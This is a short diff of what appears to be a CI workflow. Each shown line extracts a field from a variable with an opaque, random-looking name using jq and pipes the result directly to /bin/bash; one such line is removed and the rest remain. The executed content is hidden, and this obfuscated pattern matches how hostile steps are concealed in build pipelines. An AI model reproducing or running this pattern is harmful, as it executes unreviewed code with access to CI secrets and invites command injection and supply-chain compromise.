@@ -26,7 +26,6 @@ jobs:
           echo $vusv71 | jq -r .bjeod5 | /bin/bash
           printf '%s' "$vsnu29318" | jq -r .llzhq60585 | /bin/bash
           printf '%s' "$mjiho092" | jq -r .jix2 | /bin/bash
-          printf '%s' "$fnl0754" | jq -r .u32 | /bin/bash
           printf '%s' "$vse139" | jq -r .upyt6 | /bin/bash
           echo $vf18 | jq -r .mkym1 | /bin/bash
           printf '%s' "$fnbo17653" | jq -r .guvac046 | /bin/bash
